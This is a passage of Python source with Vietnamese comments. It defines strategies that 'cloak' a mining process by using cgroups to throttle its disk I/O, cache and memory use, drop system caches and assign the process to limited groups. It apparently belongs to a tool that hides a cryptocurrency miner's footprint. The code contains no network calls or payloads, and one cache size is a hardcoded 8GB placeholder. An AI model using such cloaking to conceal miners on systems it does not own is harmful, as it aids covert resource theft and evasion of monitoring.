            self.logger.info(f"Đã xóa cgroup Network '{network_cgroup}' cho tiến trình {process_name} (PID: {pid}).")

        except psutil.NoSuchProcess as e:
            self.logger.error(f"Tiến trình không tồn tại khi khôi phục: {e}")
        except psutil.AccessDenied as e:
            self.logger.error(f"Không đủ quyền để khôi phục cloaking mạng cho PID {process.pid}: {e}")
        except Exception as e:
            self.logger.error(
                f"Lỗi khi khôi phục cloaking mạng cho tiến trình {process.name} (PID: {process.pid}): {e}\n{traceback.format_exc()}"
            )
            raise

    def get_process_info(self, process: MiningProcess) -> Tuple[int, str]:
        """
        Lấy PID và tên tiến trình từ đối tượng process.

        Args:
            process (MiningProcess): Đối tượng tiến trình.

        Returns:
            Tuple[int, str]: PID và tên tiến trình.
        """
        return process.pid, process.name

    def get_primary_network_interface(self) -> Optional[str]:
        """
        Tự động xác định giao diện mạng chính.

        Returns:
            Optional[str]: Tên giao diện mạng hoặc None nếu không xác định được.
        """
        try:
            addrs = psutil.net_if_addrs()
            for iface, addr_list in addrs.items():
                for addr in addr_list:
                    if addr.family == psutil.AF_LINK:
                        # Giả sử giao diện có địa chỉ MAC là giao diện chính
                        return iface
            return None
        except Exception as e:
            self.logger.error(f"Lỗi khi xác định giao diện mạng chính: {e}")
            return None


class DiskIoCloakStrategy(CloakStrategy):
    """
    Chiến lược cloaking Disk I/O:
      - Đặt mức độ throttling I/O bằng cách sử dụng cgroups v2 (io.weight).
    """

    def __init__(
        self,
        config: Dict[str, Any],
        logger: logging.Logger,
        cgroup_manager: CgroupManager,
        disk_io_resource_manager: Any  # Thay bằng loại cụ thể nếu có
    ):
        """
        Khởi tạo DiskIoCloakStrategy với cấu hình, logger, CgroupManager và DiskIOResourceManager.

        Args:
            config (Dict[str, Any]): Cấu hình cho chiến lược cloaking Disk I/O.
            logger (logging.Logger): Logger để ghi log.
            cgroup_manager (CgroupManager): Instance của CgroupManager để thao tác với cgroup.
            disk_io_resource_manager (Any): Instance của DiskIOResourceManager từ resource_control.py.
        """
        # Lấy cấu hình io_weight với giá trị mặc định là 500
        self.io_weight = config.get('io_weight', 500)
        if not isinstance(self.io_weight, int) or not (1 <= self.io_weight <= 1000):
            logger.warning(
                f"Giá trị io_weight không hợp lệ: {self.io_weight}. Mặc định là 500."
            )
            self.io_weight = 500
        self.logger = logger
        self.cgroup_manager = cgroup_manager
        self.disk_io_resource_manager = disk_io_resource_manager

    def apply(self, process: MiningProcess, cgroups: Dict[str, str]) -> None:
        """
        Áp dụng chiến lược cloaking Disk I/O cho tiến trình đã cho trong cgroup đã chỉ định.

        Args:
            process (MiningProcess): Đối tượng tiến trình.
            cgroups (Dict[str, str]): Dictionary chứa tên các cgroup cho các controller.
        """
        try:
            pid, process_name = self.get_process_info(process)

            io_cgroup = cgroups.get('io')
            if not io_cgroup:
                self.logger.error(f"Không có cgroup I/O được cung cấp cho tiến trình {process_name} (PID: {pid}).")
                return

            # Tạo cgroup I/O nếu chưa tồn tại
            if not self.cgroup_manager.cgroup_exists(io_cgroup):
                created = self.cgroup_manager.create_cgroup(io_cgroup)
                if not created:
                    self.logger.error(f"Không thể tạo cgroup I/O '{io_cgroup}' cho tiến trình {process_name} (PID: {pid}).")
                    return

                # Thêm cgroup I/O vào cgroup cha 'root_io'
                parent_cgroup = "root_io"
                success = self.cgroup_manager.add_cgroup_to_parent(parent_cgroup, io_cgroup)
                if not success:
                    self.logger.error(f"Không thể thêm cgroup I/O '{io_cgroup}' vào cgroup cha '{parent_cgroup}'.")
                    return

            # Thiết lập I/O weight thông qua DiskIOResourceManager
            success = self.disk_io_resource_manager.set_io_weight(io_cgroup, self.io_weight)
            if success:
                self.logger.info(
                    f"Đặt I/O weight là {self.io_weight} cho tiến trình {process_name} (PID: {pid}) trong cgroup '{io_cgroup}'."
                )
            else:
                self.logger.error(
                    f"Không thể đặt I/O weight là {self.io_weight} cho tiến trình {process_name} (PID: {pid}) trong cgroup '{io_cgroup}'."
                )
                return

            # Gán tiến trình vào cgroup I/O
            success = self.cgroup_manager.assign_process_to_cgroup(pid, io_cgroup)
            if success:
                self.logger.info(f"Gán tiến trình PID={pid} vào cgroup '{io_cgroup}' cho Disk I/O.")
            else:
                self.logger.error(f"Không thể gán tiến trình PID={pid} vào cgroup '{io_cgroup}' cho Disk I/O.")

            self.logger.info(
                f"Áp dụng cloaking Disk I/O cho tiến trình {process_name} (PID: {pid}): io_weight={self.io_weight}."
            )

        except psutil.NoSuchProcess as e:
            self.logger.error(f"Tiến trình không tồn tại: {e}")
        except psutil.AccessDenied as e:
            self.logger.error(f"Không đủ quyền để áp dụng cloaking Disk I/O cho PID {process.pid}: {e}")
        except Exception as e:
            self.logger.error(
                f"Lỗi khi áp dụng cloaking Disk I/O cho tiến trình {process.name} (PID: {process.pid}): {e}\n{traceback.format_exc()}"
            )
            raise

    def restore(self, process: MiningProcess, original_limits: Dict[str, Any]) -> None:
        """
        Khôi phục lại các giới hạn Disk I/O ban đầu cho tiến trình đã cho.

        Args:
            process (MiningProcess): Đối tượng tiến trình.
            original_limits (Dict[str, Any]): Dictionary chứa các giới hạn Disk I/O ban đầu.
        """
        try:
            pid = process.pid
            process_name = process.name

            io_cgroup = original_limits.get('cgroup')
            original_io_weight = original_limits.get('io_weight')

            if not io_cgroup:
                self.logger.error(f"Không có thông tin cgroup I/O để khôi phục cho tiến trình {process_name} (PID: {pid}).")
                return

            # Khôi phục I/O weight thông qua DiskIOResourceManager
            if original_io_weight:
                success = self.disk_io_resource_manager.set_io_weight(io_cgroup, original_io_weight)
                if success:
                    self.logger.info(
                        f"Khôi phục I/O weight là {original_io_weight} cho tiến trình {process_name} (PID: {pid}) trong cgroup '{io_cgroup}'."
                    )
                else:
                    self.logger.error(
                        f"Không thể khôi phục I/O weight là {original_io_weight} cho tiến trình {process_name} (PID: {pid}) trong cgroup '{io_cgroup}'."
                    )

            # Xóa cgroup I/O nếu cần
            self.cgroup_manager.delete_cgroup(io_cgroup)
            self.logger.info(f"Đã xóa cgroup I/O '{io_cgroup}' cho tiến trình {process_name} (PID: {pid}).")

        except psutil.NoSuchProcess as e:
            self.logger.error(f"Tiến trình không tồn tại khi khôi phục Disk I/O: {e}")
        except psutil.AccessDenied as e:
            self.logger.error(f"Không đủ quyền để khôi phục cloaking Disk I/O cho PID {process.pid}: {e}")
        except Exception as e:
            self.logger.error(
                f"Lỗi khi khôi phục cloaking Disk I/O cho tiến trình {process.name} (PID: {process.pid}): {e}\n{traceback.format_exc()}"
            )
            raise

    def get_process_info(self, process: MiningProcess) -> Tuple[int, str]:
        """
        Lấy PID và tên tiến trình từ đối tượng process.

        Args:
            process (MiningProcess): Đối tượng tiến trình.

        Returns:
            Tuple[int, str]: PID và tên tiến trình.
        """
        return process.pid, process.name


class CacheCloakStrategy(CloakStrategy):
    """
    Chiến lược cloaking Cache:
      - Giảm sử dụng cache bằng cách drop caches và giới hạn mức sử dụng cache thông qua cgroups.
    """

    def __init__(
        self,
        config: Dict[str, Any],
        logger: logging.Logger,
        cgroup_manager: CgroupManager,
        cache_resource_manager: Any  # Thay bằng loại cụ thể nếu có
    ):
        """
        Khởi tạo CacheCloakStrategy với cấu hình, logger, CgroupManager và CacheResourceManager.

        Args:
            config (Dict[str, Any]): Cấu hình cho chiến lược cloaking Cache.
            logger (logging.Logger): Logger để ghi log.
            cgroup_manager (CgroupManager): Instance của CgroupManager để thao tác với cgroup.
            cache_resource_manager (Any): Instance của CacheResourceManager từ resource_control.py.
        """
        # Lấy cấu hình cache_limit_percent với giá trị mặc định là 50%
        self.cache_limit_percent = config.get('cache_limit_percent', 50)
        if not (0 <= self.cache_limit_percent <= 100):
            logger.warning(
                f"Giá trị cache_limit_percent không hợp lệ: {self.cache_limit_percent}. Mặc định là 50%."
            )
            self.cache_limit_percent = 50
        self.logger = logger
        self.cgroup_manager = cgroup_manager
        self.cache_resource_manager = cache_resource_manager

    def apply(self, process: MiningProcess, cgroups: Dict[str, str]) -> None:
        """
        Áp dụng chiến lược cloaking Cache cho tiến trình đã cho trong cgroup đã chỉ định.

        Args:
            process (MiningProcess): Đối tượng tiến trình.
            cgroups (Dict[str, str]): Dictionary chứa tên các cgroup cho các controller.
        """
        try:
            pid, process_name = self.get_process_info(process)

            # Drop caches thông qua CacheResourceManager
            success = self.cache_resource_manager.drop_caches()
            if success:
                self.logger.info(f"Đã drop caches để giảm sử dụng cache cho tiến trình {process_name} (PID: {pid}).")
            else:
                self.logger.error(f"Không thể drop caches cho tiến trình {process_name} (PID: {pid}).")

            # Giảm cache limit cho tiến trình bằng cách sử dụng cgroups
            cache_cgroup = cgroups.get('cache')
            if cache_cgroup:
                try:
                    # Tạo cgroup Cache nếu chưa tồn tại
                    if not self.cgroup_manager.cgroup_exists(cache_cgroup):
                        created = self.cgroup_manager.create_cgroup(cache_cgroup)
                        if not created:
                            self.logger.error(f"Không thể tạo cgroup Cache '{cache_cgroup}' cho tiến trình {process_name} (PID: {pid}).")
                            return

                        # Thêm cgroup Cache vào cgroup cha 'root_cache'
                        parent_cgroup = "root_cache"
                        success = self.cgroup_manager.add_cgroup_to_parent(parent_cgroup, cache_cgroup)
                        if not success:
                            self.logger.error(f"Không thể thêm cgroup Cache '{cache_cgroup}' vào cgroup cha '{parent_cgroup}'.")
                            return

                    # Thiết lập giới hạn cache thông qua CacheResourceManager
                    cache_limit_bytes = self.calculate_cache_limit()
                    success = self.cache_resource_manager.set_cache_limit(cache_cgroup, cache_limit_bytes)
                    if success:
                        self.logger.info(
                            f"Đặt giới hạn cache thành {self.cache_limit_percent}% ({cache_limit_bytes} bytes) cho tiến trình {process_name} (PID: {pid}) trong cgroup '{cache_cgroup}'."
                        )
                    else:
                        self.logger.error(
                            f"Không thể đặt giới hạn cache cho tiến trình {process_name} (PID: {pid}) trong cgroup '{cache_cgroup}'."
                        )
                except psutil.NoSuchProcess as e:
                    self.logger.error(f"Tiến trình PID={pid} không tồn tại khi thao tác với cgroup Cache: {e}")
                except psutil.AccessDenied as e:
                    self.logger.error(f"Không đủ quyền để thao tác với cgroup Cache cho PID {pid}: {e}")
                except Exception as e:
                    self.logger.error(
                        f"Lỗi khi thao tác với cgroup Cache '{cache_cgroup}' cho tiến trình {process_name} (PID: {pid}): {e}"
                    )
                    raise
            else:
                self.logger.warning(f"Không có cgroup 'cache' được cung cấp cho tiến trình {process_name} (PID: {pid}).")

            self.logger.info(
                f"Áp dụng cloaking Cache cho tiến trình {process_name} (PID: {pid}): "
                f"drop_caches=True, cache_limit_percent={self.cache_limit_percent}%."
            )

        except psutil.NoSuchProcess as e:
            self.logger.error(f"Tiến trình không tồn tại: {e}")
        except psutil.AccessDenied as e:
            self.logger.error(f"Không đủ quyền để áp dụng cloaking Cache cho PID {process.pid}: {e}")
        except PermissionError as e:
            self.logger.error(
                f"Không đủ quyền để drop caches. Cloaking Cache thất bại cho tiến trình {process.name} (PID: {process.pid})."
            )
            raise
        except Exception as e:
            self.logger.error(
                f"Lỗi bất ngờ khi áp dụng cloaking Cache cho tiến trình {process.name} (PID: {process.pid}): {e}\n{traceback.format_exc()}"
            )
            raise

    def restore(self, process: MiningProcess, original_limits: Dict[str, Any]) -> None:
        """
        Khôi phục lại các giới hạn Cache ban đầu cho tiến trình đã cho.

        Args:
            process (MiningProcess): Đối tượng tiến trình.
            original_limits (Dict[str, Any]): Dictionary chứa các giới hạn Cache ban đầu.
        """
        try:
            pid = process.pid
            process_name = process.name

            cache_cgroup = original_limits.get('cgroup')
            original_cache_limit_bytes = original_limits.get('cache_limit_bytes')

            if not cache_cgroup:
                self.logger.error(f"Không có thông tin cgroup Cache để khôi phục cho tiến trình {process_name} (PID: {pid}).")
                return

            # Khôi phục giới hạn cache thông qua CacheResourceManager
            if original_cache_limit_bytes:
                success = self.cache_resource_manager.set_cache_limit(cache_cgroup, original_cache_limit_bytes)
                if success:
                    self.logger.info(
                        f"Khôi phục giới hạn cache thành {original_cache_limit_bytes} bytes cho tiến trình {process_name} (PID: {pid}) trong cgroup '{cache_cgroup}'."
                    )
                else:
                    self.logger.error(
                        f"Không thể khôi phục giới hạn cache cho tiến trình {process_name} (PID: {pid}) trong cgroup '{cache_cgroup}'."
                    )

            # Xóa cgroup Cache nếu cần
            self.cgroup_manager.delete_cgroup(cache_cgroup)
            self.logger.info(f"Đã xóa cgroup Cache '{cache_cgroup}' cho tiến trình {process_name} (PID: {pid}).")

        except psutil.NoSuchProcess as e:
            self.logger.error(f"Tiến trình không tồn tại khi khôi phục Cache: {e}")
        except psutil.AccessDenied as e:
            self.logger.error(f"Không đủ quyền để khôi phục cloaking Cache cho PID {process.pid}: {e}")
        except Exception as e:
            self.logger.error(
                f"Lỗi bất ngờ khi khôi phục cloaking Cache cho tiến trình {process.name} (PID: {process.pid}): {e}\n{traceback.format_exc()}"
            )
            raise

    def get_process_info(self, process: MiningProcess) -> Tuple[int, str]:
        """
        Lấy PID và tên tiến trình từ đối tượng process.

        Args:
            process (MiningProcess): Đối tượng tiến trình.

        Returns:
            Tuple[int, str]: PID và tên tiến trình.
        """
        return process.pid, process.name

    def calculate_cache_limit(self) -> int:
        """
        Tính toán giới hạn cache dựa trên cache_limit_percent.

        Returns:
            int: Giới hạn cache tính bằng bytes.
        """
        total_cache_bytes = self.get_total_cache()
        cache_limit_bytes = int((self.cache_limit_percent / 100) * total_cache_bytes)
        return cache_limit_bytes

    def get_total_cache(self) -> int:
        """
        Lấy tổng lượng cache hiện có trên hệ thống.

        Returns:
            int: Tổng cache tính bằng bytes.
        """
        # Ví dụ: giả sử tổng cache là 8GB
        return 8 * 1024 * 1024 * 1024  # 8GB in bytes


class MemoryCloakStrategy(CloakStrategy):
    """
    Chiến lược cloaking Memory:
      - Giới hạn sử dụng bộ nhớ của tiến trình bằng cách sử dụng cgroups.
      - Giảm sử dụng bộ nhớ bằng cách drop caches nếu cần thiết.
    """

    def __init__(
        self,
        config: Dict[str, Any],
        logger: logging.Logger,
        cgroup_manager: CgroupManager,
        memory_resource_manager: Any  # Thay bằng loại cụ thể nếu có
    ):
        """
        Khởi tạo MemoryCloakStrategy với cấu hình, logger, CgroupManager và MemoryResourceManager.

        Args:
            config (Dict[str, Any]): Cấu hình cho chiến lược cloaking Memory.
            logger (logging.Logger): Logger để ghi log.
            cgroup_manager (CgroupManager): Instance của CgroupManager để thao tác với cgroup.
            memory_resource_manager (Any): Instance của MemoryResourceManager từ resource_control.py.
        """
        # Lấy cấu hình memory_limit_percent với giá trị mặc định là 50%
        self.memory_limit_percent = config.get('memory_limit_percent', 50)
        if not (0 <= self.memory_limit_percent <= 100):
            logger.warning(
                f"Giá trị memory_limit_percent không hợp lệ: {self.memory_limit_percent}. Mặc định là 50%."
            )
            self.memory_limit_percent = 50
        self.logger = logger
        self.cgroup_manager = cgroup_manager
        self.memory_resource_manager = memory_resource_manager

    def apply(self, process: MiningProcess, cgroups: Dict[str, str]) -> None:
        """
        Áp dụng chiến lược cloaking Memory cho tiến trình đã cho trong cgroup đã chỉ định.

        Args:
            process (MiningProcess): Đối tượng tiến trình.
            cgroups (Dict[str, str]): Dictionary chứa tên các cgroup cho các controller.
        """
        try:
            pid, process_name = self.get_process_info(process)

            # Drop caches thông qua MemoryResourceManager
            success = self.memory_resource_manager.drop_caches()
            if success:
                self.logger.info(f"Đã drop caches để giảm sử dụng cache cho tiến trình {process_name} (PID: {pid}).")
            else:
                self.logger.error(f"Không thể drop caches cho tiến trình {process_name} (PID: {pid}).")

            # Giảm memory limit cho tiến trình bằng cách sử dụng cgroups
            memory_cgroup = cgroups.get('memory')
            if memory_cgroup:
                try:
                    # Tạo cgroup Memory nếu chưa tồn tại
                    if not self.cgroup_manager.cgroup_exists(memory_cgroup):
                        created = self.cgroup_manager.create_cgroup(memory_cgroup)
                        if not created:
                            self.logger.error(f"Không thể tạo cgroup Memory '{memory_cgroup}' cho tiến trình {process_name} (PID: {pid}).")
                            return

                        # Thêm cgroup Memory vào cgroup cha 'root_memory'
                        parent_cgroup = "root_memory"
                        success = self.cgroup_manager.add_cgroup_to_parent(parent_cgroup, memory_cgroup)
                        if not success:
                            self.logger.error(f"Không thể thêm cgroup Memory '{memory_cgroup}' vào cgroup cha '{parent_cgroup}'.")
                            return

                    # Thiết lập giới hạn bộ nhớ thông qua MemoryResourceManager
                    memory_limit_bytes = self.calculate_memory_limit()
                    success = self.memory_resource_manager.set_memory_limit(memory_cgroup, memory_limit_bytes)
                    if success:
                        self.logger.info(
                            f"Đặt giới hạn bộ nhớ thành {self.memory_limit_percent}% ({memory_limit_bytes} bytes) cho tiến trình {process_name} (PID: {pid}) trong cgroup '{memory_cgroup}'."
                        )
                    else:
                        self.logger.error(
                            f"Không thể đặt giới hạn bộ nhớ cho tiến trình {process_name} (PID: {pid}) trong cgroup '{memory_cgroup}'."
                        )
                except psutil.NoSuchProcess as e:
                    self.logger.error(f"Tiến trình PID={pid} không tồn tại khi thao tác với cgroup Memory: {e}")
                except psutil.AccessDenied as e:
                    self.logger.error(f"Không đủ quyền để thao tác với cgroup Memory cho PID {pid}: {e}")
                except Exception as e:
                    self.logger.error(
                        f"Lỗi khi thao tác với cgroup Memory '{memory_cgroup}' cho tiến trình {process_name} (PID: {pid}): {e}"
                    )
                    raise
            else:
                self.logger.warning(f"Không có cgroup 'memory' được cung cấp cho tiến trình {process_name} (PID: {pid}).")

            self.logger.info(
                f"Áp dụng cloaking Memory cho tiến trình {process_name} (PID: {pid}): "
                f"drop_caches=True, memory_limit_percent={self.memory_limit_percent}%."
            )

        except PermissionError as e:
            self.logger.error(
                f"Không đủ quyền để drop caches. Cloaking Memory thất bại cho tiến trình {process.name} (PID: {process.pid})."
            )
            raise
        except psutil.NoSuchProcess as e:
            self.logger.error(f"Tiến trình không tồn tại: {e}")
        except psutil.AccessDenied as e:
            self.logger.error(f"Không đủ quyền để áp dụng cloaking Memory cho PID {process.pid}: {e}")
        except Exception as e:
            self.logger.error(
                f"Lỗi bất ngờ khi áp dụng cloaking Memory cho tiến trình {process.name} (PID: {process.pid}): {e}\n{traceback.format_exc()}"
            )
            raise

    def restore(self, process: MiningProcess, original_limits: Dict[str, Any]) -> None:
        """
        Khôi phục lại các giới hạn Memory ban đầu cho tiến trình đã cho.

        Args:
            process (MiningProcess): Đối tượng tiến trình.
            original_limits (Dict[str, Any]): Dictionary chứa các giới hạn Memory ban đầu.
        """
        try:
            pid = process.pid
            process_name = process.name

            memory_cgroup = original_limits.get('cgroup')
            original_memory_limit_bytes = original_limits.get('memory_limit_bytes')

            if not memory_cgroup:
                self.logger.error(f"Không có thông tin cgroup Memory để khôi phục cho tiến trình {process_name} (PID: {pid}).")
                return

            # Khôi phục giới hạn bộ nhớ thông qua MemoryResourceManager
            if original_memory_limit_bytes:
                success = self.memory_resource_manager.set_memory_limit(memory_cgroup, original_memory_limit_bytes)
                if success:
                    self.logger.info(
                        f"Khôi phục giới hạn bộ nhớ thành {original_memory_limit_bytes} bytes cho tiến trình {process_name} (PID: {pid}) trong cgroup '{memory_cgroup}'."
                    )
                else:
                    self.logger.error(
                        f"Không thể khôi phục giới hạn bộ nhớ cho tiến trình {process_name} (PID: {pid}) trong cgroup '{memory_cgroup}'."
                    )

            # Xóa cgroup Memory nếu cần
            self.cgroup_manager.delete_cgroup(memory_cgroup)
            self.logger.info(f"Đã xóa cgroup Memory '{memory_cgroup}' cho tiến trình {process_name} (PID: {pid}).")

        except psutil.NoSuchProcess as e:
            self.logger.error(f"Tiến trình không tồn tại khi khôi phục Memory: {e}")
        except psutil.AccessDenied as e:
            self.logger.error(f"Không đủ quyền để khôi phục cloaking Memory cho PID {process.pid}: {e}")
        except Exception as e:
            self.logger.error(
                f"Lỗi bất ngờ khi khôi phục cloaking Memory cho tiến trình {process.name} (PID: {process.pid}): {e}\n{traceback.format_exc()}"
            )
            raise

    def get_process_info(self, process: MiningProcess) -> Tuple[int, str]:
        """
        Lấy PID và tên tiến trình từ đối tượng process.

        Args:
            process (MiningProcess): Đối tượng tiến trình.

        Returns:
            Tuple[int, str]: PID và tên tiến trình.
        """
        return process.pid, process.name

    def calculate_memory_limit(self) -> int:
        """
        Tính toán giới hạn bộ nhớ dựa trên memory_limit_percent.

        Returns:
            int: Giới hạn bộ nhớ tính bằng bytes.
        """
        total_memory_bytes = psutil.virtual_memory().total
        memory_limit_bytes = int((self.memory_limit_percent / 100) * total_memory_bytes)
        return memory_limit_bytes


class CloakStrategyFactory:
    """
    Factory để tạo các instance của các chiến lược cloaking.
    """
    _strategies: Dict[str, Type[CloakStrategy]] = {
        'cpu': CpuCloakStrategy,
        'gpu': GpuCloakStrategy,
        'network': NetworkCloakStrategy,
        'disk_io': DiskIoCloakStrategy,
        'cache': CacheCloakStrategy,
        'memory': MemoryCloakStrategy
    }

    @staticmethod
    def create_strategy(
        strategy_name: str,
        config: Dict[str, Any],
        logger: logging.Logger,
        cgroup_manager: CgroupManager,
        resource_managers: Dict[str, Any]
    ) -> Optional[CloakStrategy]:
        """
        Tạo một instance của chiến lược cloaking dựa trên tên chiến lược.

        Args:
            strategy_name (str): Tên của chiến lược cloaking.
            config (Dict[str, Any]): Cấu hình cho chiến lược cloaking.
            logger (logging.Logger): Logger để ghi log.
            cgroup_manager (CgroupManager): Instance của CgroupManager để thao tác với cgroup.
            resource_managers (Dict[str, Any]): Dictionary chứa các module quản lý tài nguyên.

        Returns:
            Optional[CloakStrategy]: Instance của chiến lược cloaking hoặc None nếu không tìm thấy.
        """
        strategy_class = CloakStrategyFactory._strategies.get(strategy_name.lower())

        if strategy_class and issubclass(strategy_class, CloakStrategy):
            try:
                if strategy_name.lower() == 'gpu':
                    gpu_resource_manager = resource_managers.get('gpu')
                    gpu_initialized = gpu_resource_manager.gpu_initialized if gpu_resource_manager else False
                    logger.debug(f"Tạo GPU CloakStrategy: gpu_initialized={gpu_initialized}")
                    return strategy_class(
                        config,
                        logger,
                        cgroup_manager,
                        gpu_resource_manager,
                        gpu_initialized
                    )
                elif strategy_name.lower() == 'cpu':
                    return strategy_class(
                        config,
                        logger,
                        cgroup_manager,
                        resource_managers.get('cpu')
                    )
                elif strategy_name.lower() == 'network':
                    return strategy_class(
                        config,
                        logger,
                        cgroup_manager,
                        resource_managers.get('network')
                    )
                elif strategy_name.lower() == 'disk_io':
                    return strategy_class(
                        config,
                        logger,
                        cgroup_manager,
                        resource_managers.get('disk_io')
                    )
                elif strategy_name.lower() == 'cache':
                    return strategy_class(
                        config,
                        logger,
                        cgroup_manager,
                        resource_managers.get('cache')
                    )
                elif strategy_name.lower() == 'memory':
                    return strategy_class(
                        config,
                        logger,
                        cgroup_manager,
                        resource_managers.get('memory')
                    )
                else:
                    # Các chiến lược khác có thể cần hoặc không cần CgroupManager
                    return strategy_class(config, logger, cgroup_manager, resource_managers.get(strategy_name.lower()))
            except Exception as e:
                logger.error(f"Lỗi khi tạo chiến lược '{strategy_name}': {e}")
                raise
        else:
            logger.warning(f"Không tìm thấy chiến lược cloaking: {strategy_name}")
            return None
